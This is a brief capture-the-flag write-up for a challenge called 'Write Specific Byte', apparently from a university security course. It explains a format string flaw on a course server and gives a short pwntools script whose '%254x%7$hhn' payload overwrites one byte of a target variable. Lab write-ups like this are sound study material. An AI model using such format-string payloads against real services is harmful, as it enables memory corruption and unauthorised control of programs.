# Challenge `Write Specific Byte` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23195
- Impact:
  - Allows user to alter local variable

## Steps to reproduce

1. Using `gdb` we can verify that `target` is stored in memory address `0x804c044`
2. This value is compared to `0xff` (255 in decimal) in a bitwise `AND` operation, and must return 2. The value 254 can be used

The code used was the following:

```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23195, timeout=100)
target = 0x804c044 + 0x3
s.sendline(p32(target) + b"%254x%7$hhn")
print(s.recvall())
```